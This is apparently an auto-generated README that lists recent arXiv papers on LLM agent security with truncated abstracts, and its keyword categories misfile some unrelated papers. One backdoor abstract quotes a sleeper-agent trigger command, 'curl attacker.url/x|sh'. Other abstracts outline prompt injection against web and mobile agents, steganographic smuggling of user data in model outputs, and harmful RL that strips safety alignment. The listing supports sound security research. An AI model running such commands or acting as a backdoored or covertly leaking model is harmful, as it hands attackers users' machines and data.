<div align="center">

# AgentGuard 🛡️

**Daily Tracking of LLM Agent Security Papers on arXiv**

[![Auto Update](https://github.com/NY1024/AgentSafety-Papers/actions/workflows/daily-update.yml/badge.svg)](https://github.com/NY1024/AgentSafety-Papers/actions/workflows/daily-update.yml)
[![Papers](https://img.shields.io/badge/Papers-37041-blue)](#)
[![License](https://img.shields.io/badge/License-MIT-green)](#)

</div>

---

## 📖 简介 / Introduction

自动追踪 arXiv 上大模型 Agent 安全方向的最新论文，每日更新，关键词智能分类。

*Automatically tracking the latest LLM Agent security papers on arXiv, updated daily with keyword-based classification.*

**最近更新 / Last Updated**: 2026-11-14 05:18 ｜ **论文总数 / Total Papers**: 37041（近 30 天 / Recent 30 days: 4104）

🌐 **[GitHub Pages](https://ny1024.github.io/AgentSafety-Papers/)** — 查看全部 37041 篇论文（含摘要、分类筛选、搜索）/ View all 37041 papers with abstracts, filters & search

## 📑 分类导航 / Category Navigation

- **[jailbreak](#-jailbreak)** — 越狱攻击 / Jailbreak Attacks — 719
- **[prompt-injection](#-prompt-injection)** — 提示注入攻击 / Prompt Injection Attacks — 682
- **[memory-poisoning](#-memory-poisoning)** — 记忆投毒与篡改 / Memory Poisoning & Tampering — 59
- **[tool-use-attack](#-tool-use-attack)** — 工具使用攻击 / Tool-Use Attacks — 175
- **[backdoor](#-backdoor)** — 后门与投毒攻击 / Backdoor & Poisoning Attacks — 558
- **[adversarial-attack](#-adversarial-attack)** — 对抗攻击 / Adversarial Attacks — 668
- **[privacy-leakage](#-privacy-leakage)** — 隐私泄露 / Privacy Leakage — 4588
- **[steganography](#-steganography)** — 隐写与隐蔽通信 / Steganography & Covert Communication — 93
- **[misuse](#-misuse)** — 滥用与误用 / Misuse & Abuse — 1314
- **[red-teaming](#-red-teaming)** — 红队测试 / Red Teaming — 153
- **[vulnerability](#-vulnerability)** — 漏洞与攻击面 / Vulnerabilities & Attack Surfaces — 3997
- **[defense](#-defense)** — 防御与防护方法 / Defense & Protection Methods — 3898
- **[alignment](#-alignment)** — 对齐与安全约束 / Alignment & Safety Constraints — 3657
- **[robustness](#-robustness)** — 鲁棒性与可靠性 / Robustness & Reliability — 4009
- **[watermark](#-watermark)** — 水印与溯源 / Watermarking & Provenance — 754
- **[unlearning](#-unlearning)** — 机器遗忘 / Machine Unlearning — 120
- **[agent-safety](#-agent-safety)** — Agent 安全框架 / Agent Safety Frameworks — 67
- **[benchmark](#-benchmark)** — 安全评测与基准 / Safety Benchmarks & Evaluation — 75
- **[survey](#-survey)** — 综述与系统化 / Surveys & Systematization — 453
- **[other](#-other)** — 其他安全相关 / Other Security-Related — 11002

## 📄 近期论文 / Recent Papers (Last 30 Days)

> 仅展示最近 30 天中最新的 500 篇论文（含日期、作者、摘要）。近 30 天共 4104 篇，完整 37041 篇论文列表请访问 [GitHub Pages](https://ny1024.github.io/AgentSafety-Papers/)

> Showing the latest 500 of 4104 papers from the last 30 days (with date, authors & abstract). For the full list of 37041 papers, visit [GitHub Pages](https://ny1024.github.io/AgentSafety-Papers/)

### 📂 jailbreak
*越狱攻击 / Jailbreak Attacks* — 3 papers

- **2026-11-12** — Hongyu Li, Zhan Yu, Zhe Zhao et al. — [Data-Efficient LLM Safety Alignment Guided by Interpretable Features](http://arxiv.org/abs/2611.16183v1)
  <details><summary>📄 Abstract</summary>
  Existing large language models typically rely on massive fine-tuning datasets for safety alignment, which results in higher costs for safety alignment and often leads to the problem of over-refusal. We propose Less is Safer (LIS), a compact yet highly effective dataset for safety alignment, constructed through interpretable feature-guided selection and adversarial synthesis. Specifically, we leverage Sparse Autoencoder (SAE) activations to efficiently select prompts that cover diverse and interp...
  </details>

- **2026-11-10** — Haoyi Wu, Yunkai Dang, Wanyu Zhang et al. — [POEM: Output-Relative Block-Sparse Attention for Long-Context Prefilling](http://arxiv.org/abs/2611.13578v1)
  <details><summary>📄 Abstract</summary>
  Large language models (LLMs) have shown strong capabilities across diverse applications, making both safety and utility essential for reliable deployment. Jailbreak attacks use diverse forms of adversarial prompting to bypass alignment safeguards and induce LLMs to generate harmful responses. Some representation-based defenses regulate internal activations using predefined steering directions or learned safety regions. However, adapting intervention to each input without a predefined representat...
  </details>

- **2026-11-10** — Yunkai Dang, Wanyu Zhang, Meiyi Zhu et al. — [TERM: Target-Free Jailbreak Defense via Entropy-Guided Residual Modulation](http://arxiv.org/abs/2611.13577v1)
  <details><summary>📄 Abstract</summary>
  Large language models (LLMs) have shown strong capabilities across diverse applications, making both safety and utility essential for reliable deployment. Jailbreak attacks use diverse forms of adversarial prompting to bypass alignment safeguards and induce LLMs to generate harmful responses. Some representation-based defenses regulate internal activations using predefined steering directions or learned safety regions. However, adapting intervention to each input without a predefined representat...
  </details>


### 📂 prompt-injection
*提示注入攻击 / Prompt Injection Attacks* — 5 papers

- **2026-11-12** — Zimo Xu, Wenzhuo Liu, Hideki Nakayama — [CapLite: Prompt-Injection Defense for Small Language Model Agents without Model-Written Security Artifacts](http://arxiv.org/abs/2611.17115v1)
  <details><summary>📄 Abstract</summary>
  Enforcement defenses against prompt injection, such as CaMeL, Progent, IPIGuard and DRIFT, ask the agent's own model to write a security artifact (a program, a privilege policy, a dependency graph or a constraint list) that code then enforces. We ask whether small language model (SLM) agents can be trusted to write these artifacts. Across 15 open-weight models, 13 of them between 1.7B and 12B parameters, they cannot: the policies, graphs and constraints that the agent's model writes admit attack...
  </details>

- **2026-11-12** — Yiheng Zhao, Runze Ji, Chenyu Yi et al. — [Scale-Induced Semantic Shift in Visual Prompt Injection Against VLMs and Web Agents](http://arxiv.org/abs/2611.16744v1)
  <details><summary>📄 Abstract</summary>
  Visual content in multimedia systems may be resized, compressed, or re-rendered before it is interpreted by a vision-language model. We study a security failure mode in which these transformations change the machine-readable semantics of an image: a textual instruction is not recovered at a $512\times512$ presentation resolution under our evaluation protocol but becomes recoverable after aggressive downsampling. We formulate this behavior as Scale-Induced Semantic Shift (SISS) and develop a clos...
  </details>

- **2026-11-12** — Yingbin Jin, Ji'an Wang, HaoYang Chai et al. — [MobileProbe: Adaptive Security Evaluation of Mobile Agents via Trajectory-Aware Injection](http://arxiv.org/abs/2611.16693v1)
  <details><summary>📄 Abstract</summary>
  Mobile GUI agents read the screen of a phone and operate apps on a user's behalf to complete multi-step tasks such as online shopping or messaging. Because the agent acts on whatever the screen shows, an attacker can embed malicious instructions into ordinary UI content and redirect its actions. We refer to this threat as environmental injection attack (EIA). Existing benchmarks measure this risk by pinning hand-crafted payloads to a fixed step of a fixed task. This approach faces two limitation...
  </details>

- **2026-11-12** — Fady Copty, Neta Haiby, Max Braitmaiere et al. — [Intent-Aware Protection for AI Agents](http://arxiv.org/abs/2611.16122v1)
  <details><summary>📄 Abstract</summary>
  AI agents increasingly access enterprise data, invoke powerful tools, and act with limited human oversight. Existing security defenses primarily detect prompt injection, harmful outputs, or suspicious behavior, but do not determine whether an agent remains faithful to the purpose for which it was deployed. An action may contain no attack pattern and stay within granted permissions while still violating the agent's role, organizational constraints, or purpose. We introduce Intent- Aware Security,...
  </details>

- **2026-11-11** — Hesham Elbakoury, Deep Shah, Ankur Sharma — [Smart Model Routing for Order-of-Magnitude LLM Cost Reduction](http://arxiv.org/abs/2611.15911v1)
  <details><summary>📄 Abstract</summary>
  Frontier large language models (LLMs) deliver the strongest response quality but carry per-token prices often more than an order of magnitude above those of smaller, task-adequate models. Smart model routing addresses this mismatch by assigning each query to the cheapest model expected to answer it adequately, rather than sending every request to the most capable, most expensive endpoint. This paper develops a formal cost-quality optimization framework for routing -- including a derived optimal ...
  </details>


### 📂 memory-poisoning
*记忆投毒与篡改 / Memory Poisoning & Tampering* — 1 papers

- **2026-11-10** — Vicenç Torra, Maria Bras-Amorós — [On Private Knowledge Retrieval and Private Inference for secure multi-agent systems](http://arxiv.org/abs/2611.13696v1)
  <details><summary>📄 Abstract</summary>
  Multi-agent systems provide a convenient framework for the massive deployment of agents based on Large Language Models (LLMs). It provides a sound framework where agents can interact with existing software to perform actions in an autonomous way. Agentic AI is the new term to denote these AI-based autonomous systems.   In real multi-agent systems, agents need to deal with malicious agents some of which can exploit security vulnerabilities to do harm. A memory poisoning attack is an example of ex...
  </details>


### 📂 tool-use-attack
*工具使用攻击 / Tool-Use Attacks* — 1 papers

- **2026-11-11** — Zikai Alex Wen, Donald Chinn, Yan Bai — [An Experience Report on Teaching Students to Evaluate AI Agent Skills as Authorization Decisions](http://arxiv.org/abs/2611.15170v1)
  <details><summary>📄 Abstract</summary>
  Cultivating a security mindset has long been a goal of computing education, and students now need it when deciding whether to trust an AI agent skill. Skills are add-ons that can shape an agent's behavior through natural language instructions and configuration settings, not just executable code. To prepare students to evaluate skills as authorization decisions, we designed a classroom activity and taught it in a senior undergraduate and a graduate cybersecurity-focused course. Students inspected...
  </details>


### 📂 backdoor
*后门与投毒攻击 / Backdoor & Poisoning Attacks* — 3 papers

- **2026-11-11** — Yuchen Zeng, Giorgio Severi, Blake Bullwinkel et al. — [Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents](http://arxiv.org/abs/2611.15118v1)
  <details><summary>📄 Abstract</summary>
  Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine. Agents now run unattended for hours with privileged system access, making the integrity of model weights a security concern whether a model comes from third parties or is developed internally. We show that a method we call Lazarus can turn a capable model into such a sleeper agent by editing fewer than ten neu...
  </details>

- **2026-11-11** — Jiayang Li, Tianqing Zhu, Longxiang Gao et al. — [Protecting Sensitive Knowledge Under LLM Unlearning: The Proxy Threat and a Superposition-Aware Defense](http://arxiv.org/abs/2611.15013v1)
  <details><summary>📄 Abstract</summary>
  Machine unlearning lets the owner of large language models (LLMs) remove specific entities from a trained model without retraining from scratch. Existing machine unlearning methods focus on removing the requested entities while maintaining utility. However, we observe that the representations of distinct entities in an LLM may overlap in shared parameter subspaces, a phenomenon known as knowledge superposition. Removing one entity may then affect other entities. This exposes a new security threa...
  </details>

- **2026-11-10** — Yuhong Wang, Yujun Cai, Lei Feng et al. — [GARD: Gradient-Guided Adversarial Representation Defense against Backdoors in Multimodal Contrastive Learning Models](http://arxiv.org/abs/2611.14143v1)
  <details><summary>📄 Abstract</summary>
  Multimodal contrastive learning models such as CLIP are vulnerable to backdoor attacks with diverse trigger structures, ranging from localized patches to globally distributed perturbations, with recent attacks increasingly optimizing these triggers in the representation space. Existing post-hoc defenses based on clean fine-tuning may leave backdoors active, while trigger-inversion methods depend on accurately estimating the attack target and trigger. We observe that backdoored encoders exhibit s...
  </details>


### 📂 adversarial-attack
*对抗攻击 / Adversarial Attacks* — 2 papers

- **2026-11-12** — Bo Han — [Safety as a Budget: Calibrating the Control Channel of Constrained GRPO for Vision-Language Models](http://arxiv.org/abs/2611.16628v1)
  <details><summary>📄 Abstract</summary>
  Reinforcement learning can teach vision-language models (VLMs) to decline harmful image-text requests, but how safe the result becomes is set indirectly, through reward weights found by trial runs. Stating safety as budgets on the rate of harmful assistance and the rate of over-refusal, enforced by Lagrange multipliers inside GRPO with an off-the-shelf scorer as the cost, is the natural fix, and it fails twice. The multiplier compares the scorer's mean with the budget, and scorers built for rank...
  </details>

- **2026-11-10** — Sedjro Salomon Hotegni, Konstantin Sonntag, Paul-Christian Bürkner et al. — [Lipschitz-Controlled Flow Matching for Robust Image Restoration](http://arxiv.org/abs/2611.13995v1)
  <details><summary>📄 Abstract</summary>
  Flow-matching models can produce high-quality image restorations, but their learned dynamics may amplify small input perturbations and make reconstructions unstable. We introduce LipsFlower to reduce this amplification. We derive stability bounds for Flow-from-$Y$, which initializes the ordinary differential equation from a noise-perturbed observation, as well as for observation-conditioned posterior sampling, which conditions the velocity field on the observation throughout integration. Based o...
  </details>


### 📂 privacy-leakage
*隐私泄露 / Privacy Leakage* — 22 papers

- **2026-11-12** — Aman Mujahid, Anita Penkova — [Beyond Binary Classification: Multiclass Machine Learning for Diabetes and Prediabetes Risk Prediction Using NHANES](http://arxiv.org/abs/2611.16756v1)
  <details><summary>📄 Abstract</summary>
  Detecting diabetes risk early is important for preventing disease progression. Most existing machine learning approaches focus on binary classification, which limits their ability to capture intermediate risk states such as prediabetes. We develop a supervised learning framework to classify adults as normal, prediabetic, or diabetic using National Health and Nutrition Examination Survey data. The framework uses routinely collected demographic, clinical, and lifestyle variables from 15,356 adults...
  </details>

- **2026-11-12** — Julian Szymanski, Tomasz Sankowski, Piotr Sulewski et al. — [Acoustic Respiratory Phase Detection on Mobile Devices](http://arxiv.org/abs/2611.16710v1)
  <details><summary>📄 Abstract</summary>
  Breathing monitoring is important for well-being, stress regulation, and guided breathing exercises, yet existing approaches often rely on contact-based sensors or controlled environments. This paper presents a non-invasive framework for respiratory phase detection using acoustic signals recorded on commodity smartphones. The proposed hybrid CNN-Transformer architecture combines local spectral feature extraction with long-range temporal modeling to capture the cyclic structure of breathing. The ...
  </details>

- **2026-11-12** — Zhiyu Hou, Wen-Jie Shu, Harold Haodong Chen et al. — [WorldDraft: If Code Builds the World, Can Video Models Just Render It?](http://arxiv.org/abs/2611.16217v1)
  <details><summary>📄 Abstract</summary>
  Multimodal coding agents decouple 4D world construction from visual generation, repurposing video models from world generators toward generative renderers. This division of labor raises a fundamental question: if code builds the world, can video models just render it? A reliable generative renderer hinges on two complementary criteria: (i) world preservation, retaining prescribed 4D kinematics and camera paths; and (ii) visual realization, persistently binding text-specified target attributes ov...
  </details>

- **2026-11-12** — Oleg Grynets, Vasyl Lyashkevych, Valeriia Oliferuk et al. — [Does a Self-Learning Migration Agent Learn? An Audited Evaluation of Evidence-Graded Experience Memory for Oracle-to-PostgreSQL Migration](http://arxiv.org/abs/2611.16143v1)
  <details><summary>📄 Abstract</summary>
  Do large language model (LLM) migration agents learn from accumulated experience, or do apparent gains reflect retrieval and reference reuse? We evaluate an evidence-graded agent for Oracle-to-PostgreSQL migration across four studies. On 1,833 documentation-derived source-reference pairs, persistent memory improved reference conformity (RC) over a no-memory baseline by 0.015 [0.004, 0.025], while policy adaptation added no gain (-0.004 [-0.010, 0.001]). An audit found that 264 of 367 held-out un...
  </details>

- **2026-11-11** — Sujan Maharjan, Lu Liu — [ShadowBench: Exposing Lexical Anchoring and the Illusion of Forgetting in Large Language Models](http://arxiv.org/abs/2611.15925v1)
  <details><summary>📄 Abstract</summary>
  Large Language Models (LLMs) have emerged as primary interfaces for factual retrieval, yet current evaluation paradigms rely almost exclusively on explicit entity names. In this work, we demonstrate that LLM knowledge is fundamentally lexically anchored: models possess extensive factual information but find it significantly difficult to retrieve without explicit name tokens. To quantify this limitation, we introduce ShadowBench, a rigorously hardened, shortcut-resistant benchmark designed to eva...
  </details>

- **2026-11-11** — Peiyao Wang, Jiahui Sun, Weining Wang et al. — [WaveletLoRA: Frequency-Aware Content-Style Decomposition for Personalized Image Generation](http://arxiv.org/abs/2611.15617v1)
  <details><summary>📄 Abstract</summary>
  Content-style decomposition from a single image is a fundamental challenge in personalized image generation, aiming to separate subject identity from visual style for flexible recomposition. Existing approaches primarily operate in the spatial domain, without explicitly exploiting the distinct frequency characteristics naturally associated with content and style. In this paper, we propose WaveletLoRA, a novel frequency-aware framework for explicit content-style decomposition through wavelet-doma...
  </details>

- **2026-11-11** — Hao Liu, Jing Yu, Weizhi Liu et al. — [Your Secrets Are Showing: Deep Image Hiding Models Are Surprisingly Easy to Attack](http://arxiv.org/abs/2611.15583v1)
  <details><summary>📄 Abstract</summary>
  In this work, we ask whether an attacker can go beyond detecting a hidden image and tell what it depicts, even without knowing which model hid it. We show that, for deep image hiding, this is surprisingly easy. To test this, we build an evaluation dataset of stego images generated by 11 hiding models. These models span two families (invertible neural networks and autoencoders), use different backbones (CNN, Transformer, and Mamba), and include both spatial- and frequency-domain hiding methods. W...
  </details>

- **2026-11-11** — Weimin Fu, Shikun Liu, Qiying Li et al. — [Privacy Leakage from Recurrent State in LLM Inference](http://arxiv.org/abs/2611.16048v1)
  <details><summary>📄 Abstract</summary>
  Personalized LLM services place private facts and application instructions into a prompt, then retain representations of that context for later inference. Latent-state LLMs compress part of this history into fixed-size recurrent state. The information preserved by its learned updates is implicit, and later computation can expose it even when an observer receives neither the private text nor the responses. We investigate privacy leakage from recurrent state through partial-state probing and physi...
  </details>

- **2026-11-11** — Hernan David Santos, Yinong Chen, Yu Ding et al. — [Subject-Held-Out Evaluation of Deep Ground Reaction Force Estimators Across Two Laboratories: Leakage and Cross-Laboratory Transfer](http://arxiv.org/abs/2611.15966v1)
  <details><summary>📄 Abstract</summary>
  Deep networks that estimate ground reaction forces and centers of pressure from motion-capture markers are validated within one laboratory, in a seldom-stated coordinate frame, and sometimes with trial-level splits that put the same person in the training and the test set. We measured what each practice costs, and whether such models transfer between laboratories. Three sequence models (convolutional, convolutional-recurrent, and convolutional-transformer) were evaluated on two independent datas...
  </details>

- **2026-11-11** — Ruiyi Yang, Gayathri Lihinikaduarachchi, Rahat Masood et al. — [GuardianAgentFlow: Multi-Agent Coordination for Web Privacy Protection](http://arxiv.org/abs/2611.15097v1)
  <details><summary>📄 Abstract</summary>
  Web agents need to use private context without unnecessarily disclosing it. Effective protection must distinguish between requests that may be sent after sanitization and those that must be withheld, while preserving the information needed for authorized tasks. We present GuardianAgentFlow, a multi-agent framework that mediates outgoing Web requests through an explicit release contract. A dedicated restriction check grounds permission in the user's instruction; a shared protection scope aligns r...
  </details>

- **2026-11-11** — Alexander Gräfe, Max van Gemmeren, Paul Brunzema et al. — [Efficient Knowledge Transfer in Federated Bayesian Optimization through Neural Network Surrogates](http://arxiv.org/abs/2611.15707v1)
  <details><summary>📄 Abstract</summary>
  Federated Bayesian Optimization (FedBO) has emerged as a powerful paradigm for enhancing Bayesian Optimization (BO) in distributed, privacy-sensitive settings, enabling agents to accelerate the optimization of their local objectives by sharing knowledge about their similarities without exposing raw data. However, existing methods rely on restrictive assumptions, such as near-identical objective functions or shared Gaussian process hyperparameters that are often violated in heterogeneous real-wor...
  </details>

- **2026-11-11** — Jiali Cheng, Oleg Rokhlenko, Joo-Kyung Kim et al. — [DecArena: Evaluating Large-Scale Decentralized Multi-Agent Collaboration](http://arxiv.org/abs/2611.15521v1)
  <details><summary>📄 Abstract</summary>
  Emerging personal AI agents raise fundamental scalability and privacy concerns for centralized multi-agent systems (MASs), which rely on a global orchestrator with broad access to agents, resources, and communication. In decentralized environments, global visibility is unavailable. Agents need to proactively discover non-local resources (e.g. tools, skills), and collaborate with other agents to solve tasks. We study decentralized multi-agent collaboration under graph-constrained communication, a...
  </details>

- **2026-11-11** — Ignacio Cofone, Katherine J. Strandburg, Nicholas Tilmes — [Taxonomizing Synthetic Data for Law](http://arxiv.org/abs/2611.15489v1)
  <details><summary>📄 Abstract</summary>
  Synthetic data is increasingly important in data usage and AI design, creating novel legal and policy dilemmas. All too often, discussions of synthetic data treat it as entirely distinct from "real," collected data, overlooking the risks posed by different kinds and uses of synthetic data. We build on Michal Gal and Orla Lynskey's argument that synthetic data will transform information privacy, market competition, and data quality. While the risks posed by synthetic data depend on its connection...
  </details>

- **2026-11-11** — Luke Collins, Chang-Tsun Li, Duc Thanh Nguyen — [Honest Fusion Evaluation for Cross-Domain Deepfake Detection: Leakage Audits and Tail Robustness](http://arxiv.org/abs/2611.14856v1)
  <details><summary>📄 Abstract</summary>
  Cross-domain video deepfake detection increasingly uses frozen foundation-model experts, combined by calibrated score averaging, a per-video router picking one expert, or a learned head over concatenated features. Expressive routing and feature fusion are often reported to beat plain averaging. Across a 22-dataset frozen-expert testbed, we find those gains are largely evaluation artifacts. A corner theorem locates the gap routing aims to close: because AUC depends only on score ordering, the bes...
  </details>

- **2026-11-10** — Yifei Wang, Tsun-yu Yang, Yechen Xu et al. — [Tideway: Phase-Aware Tiered Memory Management for MoE Inference on Consumer Devices](http://arxiv.org/abs/2611.14848v1)
  <details><summary>📄 Abstract</summary>
  Large language model (LLM) agents are rapidly becoming a dominant paradigm for AI applications. Recently, there is a growing demand to deploy large-scale Mixture-of-Experts (MoE) models locally on consumer PCs to balance data privacy, API costs, and inference efficiency. However, unlike datacenter servers with abundant DRAM, consumer devices are tightly constrained in both GPU VRAM and host RAM, forcing massive MoE weights to spill across VRAM, host RAM, and SSD. Under such spilling, we observe ...
  </details>

- **2026-11-10** — Moon-Il Joo, Md Ariful Islam Mozumder, Hee-Cheol Kim — [An Asynchronous Federated Learning Platform for Lung Adenocarcinoma Grading via Foundation Models and Structural Pruning](http://arxiv.org/abs/2611.14590v1)
  <details><summary>📄 Abstract</summary>
  Classification of lung adenocarcinoma into poorly differentiated (PD) and well-to-moderately differentiated (WMD) subtypes plays an important role in patient survival; however, consistent classification is difficult due to inter-observer variability among pathologists. Collecting data from multiple hospitals is also challenging due to patient privacy concerns. This study proposes a web-based federated learning system that shares only locally trained model weights without sharing patient data bet...
  </details>

- **2026-11-10** — Xingqi Wang, Xiaoyuan Yi, Xing Xie et al. — [Specify Privacy Yourself: Assessing Inference-Time Personalized Privacy Preservation Ability of Large Vision-Language Models](http://arxiv.org/abs/2611.13997v1)
  <details><summary>📄 Abstract</summary>
  Large Vision-Language Models (LVLMs) have demonstrated remarkable capabilities but raise significant privacy concerns due to their abilities to infer sensitive personal information from images with high precision. While current LVLMs are relatively well aligned to protect universal privacy, e.g., credit card data, we argue that privacy is inherently personalized and context-dependent. This work pivots towards a novel task: can LVLMs achieve Inference-Time Personalized Privacy Protection (ITP$^3$...
  </details>

- **2026-11-10** — Linru Zhang, Xiangning Wang, Jun Jie Sim et al. — [MOAI: Module-Optimizing Architecture for non-interactive secure transformer Inference](http://arxiv.org/abs/2611.13641v1)
  <details><summary>📄 Abstract</summary>
  Privacy concerns have been raised in Large Language Models (LLM) inference when models are deployed in Cloud Service Providers (CSP). Homomorphic encryption (HE) offers a promising solution by enabling secure inference directly over encrypted inputs. However, the high computational overhead of HE remains a major bottleneck. To address this challenge, we propose MOAI, an efficient HE-based, non-interactive framework for secure transformer inference. MOAI gains significant efficiency improvement f...
  </details>

- **2026-11-10** — Runjia Li, Minghao Chen, Junyu Xie et al. — [OnlyAct: Extracting Action Representations from Foundation Models for World Models](http://arxiv.org/abs/2611.14420v1)
  <details><summary>📄 Abstract</summary>
  Video world models promise general-purpose interactive simulators, but their training is limited by action supervision: action labels are scarce, fragmented across incompatible specifications, and do not scale with the unlabeled video pretraining corpus. A common workaround jointly trains an action encoder to compress consecutive frames into a latent action and a decoder to reconstruct the next frame from the previous frame and that latent, forcing the latent to capture only new information. Thi...
  </details>

- **2026-11-10** — Xintao Xia, Jia Gu — [Differentially Private Statistical Inference for Rankings from Pairwise Comparisons](http://arxiv.org/abs/2611.13485v1)
  <details><summary>📄 Abstract</summary>
  Reliable inference for rankings of large language models based on human pairwise comparisons must preserve the privacy of individual preference records. To meet this need, we develop methods for score and rank inference under the Bradley-Terry model with edge differential privacy. For an objective-perturbed estimator, a new leave-one-out analysis establishes finite-sample bounds on Euclidean and entrywise estimation errors. For sufficiently dense comparison graphs, the error bounds extend to sma...
  </details>

- **2026-11-09** — Hao Zhao, Minghao Lin — [DEPUTYBENCH: Evaluating Contextual Safety in Enterprise Agents](http://arxiv.org/abs/2611.13355v1)
  <details><summary>📄 Abstract</summary>
  Enterprise agents must determine whether ordinary requests are permitted by organizational records and policies while continuing legitimate work. We introduce DEPUTYBENCH, an executable benchmark with 79 base items, 375 instances, paired permission contexts, and graded evidence requirements. Across 12 models, revised audits give 88.0% pooled safety and 79.1% paired success. A controlled study of 28 derived tasks and six models tests authorization-fact flips, evidence masking, and irrelevant rewr...
  </details>

- **2026-11-09** — Masanori Hanada, Jiwoo Seo, Seok-Kyun Son et al. — [Quantum simulation of real-time bosonic dynamics with binary and unary position encodings on superconducting and trapped-ion processors](http://arxiv.org/abs/2611.13079v1)
  <details><summary>📄 Abstract</summary>
  Simulating a bosonic degree of freedom on qubit hardware requires discretizing its position space, and the qubit encoding of the resulting lattice determines the circuits that realize its real-time dynamics. We compare binary and unary encodings of a position lattice on superconducting (IBM) and trapped-ion (IonQ) processors. Binary encoding applies the kinetic term through the quantum Fourier transform; unary encoding uses one qubit per site, single-qubit rotations for the potential and excitat...
  </details>


### 📂 steganography
*隐写与隐蔽通信 / Steganography & Covert Communication* — 3 papers

- **2026-11-12** — Gautam Galada, Supreeth Shastri, Sagnik Ray Choudhury — [Synthesis Smuggling: Maliciously Hiding Inferred Personal Attributes in LLM Outputs](http://arxiv.org/abs/2611.17280v1)
  <details><summary>📄 Abstract</summary>
  We propose Synthesis Smuggling, a novel threat model in which an adversarial LLM infers sensitive information about a user from routine assistance-seeking interactions and steganographically encodes that into innocuous-looking model-generated content. The user may then unknowingly transmit that information by sharing the generated artifact, say as an email, social-media post, or message, through ordinary communication channels. An adversary monitoring these channels can discover this information...
  </details>

- **2026-11-12** — Feng Jiang — [Optimal Single-History Tokenization Disambiguation for Provably Secure Linguistic Steganography](http://arxiv.org/abs/2611.17091v1)
  <details><summary>📄 Abstract</summary>
  Provably secure linguistic steganography assumes that the receiver recovers the sender's tokens, but a text channel delivers only text, and ambiguous tokenizations break extraction. Existing fixes change the distribution, synchronize whole pools of tokens at a capacity that collapses with large vocabularies, or track several token histories. We prove that if extraction is exact and error-free across full-support language models, a single-history receiver is confined to a prefix-free candidate se...
  </details>

- **2026-11-12** — William Fleshman — [STEALTH: Steganographic Text Encoding Agnostic to Low-Level Tensor Hardware](http://arxiv.org/abs/2611.16928v1)
  <details><summary>📄 Abstract</summary>
  Provably secure linguistic steganography hides a message inside text sampled from a language model, so that without the key, a stegotext is computationally indistinguishable from an honest model sample. Nearly every such scheme assumes the receiver can recompute the sender's token probabilities exactly bit for bit. We show this assumption is fragile: across three model families, bit-exact schemes decode almost none of our messages once the receiver's floating-point precision, quantization, or GP...
  </details>


### 📂 misuse
*滥用与误用 / Misuse & Abuse* — 10 papers

- **2026-11-12** — Tiansheng Huang, Ananth Balashankar, Virat Shejwalkar et al. — [Bait: Mitigating Harmful Agentic Reinforcement Learning via Probing Reward Function](http://arxiv.org/abs/2611.16369v1)
  <details><summary>📄 Abstract</summary>
  We expose a safety vulnerability on nascent agentic reinforcement-learning-as-a-service. Specifically, with a cost as low as \$20, we show that safety alignment of a large language model (e.g., Inkling) can be completely subverted through rounds of harmful agentic reinforcement learning (agentic RL) with a toxic environment from its users. We also demonstrate that upon a successful harmful agentic RL attack via the service API, the attackers can potentially use the safety-degraded model to assis...
  </details>

- **2026-11-12** — Junru Zhu — [SwarmSafe-Delta: Isolating Message Effects on LLM Agent Safety](http://arxiv.org/abs/2611.16123v1)
  <details><summary>📄 Abstract</summary>
  When a tool-using LLM agent team violates policy, aggregate outcomes do not reveal whether an upstream message changed the executor's action. We introduce SwarmSafe-Delta, a paired executable protocol that freezes upstream computation, varies real, hidden, and format-matched placebo delivery, and scores a single committed action against deterministic benign and risky policy states under preassigned budgets.   Across four models and constructed optional tasks, real delivery at $N=4$ produces 21.4...
  </details>

- **2026-11-11** — Maria Ios Glarou, Martin Jaggi — [DETER: Suppression During Pretraining for Tamper Resistance](http://arxiv.org/abs/2611.15479v1)
  <details><summary>📄 Abstract</summary>
  Open-weight language models can acquire knowledge that could enable biological, chemical, or cyber misuse. Any attempt to limit such knowledge must remain effective after the model weights are released and can be fine-tuned. Unlearning applied after pretraining can be rapidly undone, whereas filtering the pretraining corpus offers greater resistance. We ask whether actively suppressing knowledge during pretraining can further increase the fine-tuning required to acquire it. Even simple gradient ...
  </details>

- **2026-11-11** — Qinghui Gong, Jinshan Lai, Xunlei Chen et al. — [From Concepts to Interactions: Dynamic Graph Semantic Recomposition for Safe Visual Generation](http://arxiv.org/abs/2611.15149v1)
  <details><summary>📄 Abstract</summary>
  Recent advances in flow-matching Transformers have greatly improved Text-to-Image (T2I) and Text-to-Video (T2V) generation, but unconstrained generation risks producing illegal or unethical content. Safety alignment must therefore suppress unsafe content while preserving legitimate generation. A concept's safety depends on context: a knife used for cooking is safe, whereas its use in violence is harmful. Yet most concept erasure methods indiscriminately suppress static, isolated representations,...
  </details>

- **2026-11-11** — Mohammad Omar Khursheed, Thomas Morris, Fabien Roger — ["It's Just a Small Weapon": What Rewarding Misbehavior During RL Does to Character-Trained Models](http://arxiv.org/abs/2611.16069v1)
  <details><summary>📄 Abstract</summary>
  Developers train models to follow a consistent character using methods like Model Spec Midtraining (Li et al., 2026), which have been hypothesized to make alignment more robust and generalize broadly. However, it is possible for subsequent RL with misspecified rewards to work against character training. In this work, we apply character training to teach gpt-oss-20b a semi-realistic constitution and study how it interacts with two types of RL that reward breaking the constitution's rules (opposin...
  </details>

- **2026-11-11** — Natraj Raman, Abhenandhan Manoharan, Vishwasreddy Thuniki et al. — [Large Payments Model](http://arxiv.org/abs/2611.15814v1)
  <details><summary>📄 Abstract</summary>
  Payment applications such as fraud detection, authorization prediction, and payment optimization draw on overlapping transaction information. This motivates a reusable payments intelligence layer that shares learned representations and predictive signals, rather than developing predictive models independently for each task. Realizing this shared capability requires handling heterogeneous transaction fields, high-cardinality identifiers, lifecycle-dependent attributes, long histories, and rare ou...
  </details>

- **2026-11-11** — Chenyang Li, Qifan Yu, Saihui Hou et al. — [Beyond the Explicit: Benchmarking and Detecting Implicit Harm in Short Videos](http://arxiv.org/abs/2611.15306v1)
  <details><summary>📄 Abstract</summary>
  Short videos have become a dominant online medium, where harmful content is increasingly conveyed in implicit and fragmented forms. Prior work largely focuses on explicit categories, such as violence and hate speech, and often fails to detect videos that subtly promote misleading values through narrative context, emotional framing, or cross-modal cues, partly due to the lack of dedicated benchmarks for implicit harm. To bridge this gap, we construct DeepHarm-7K, a large-scale harmful short-video...
  </details>

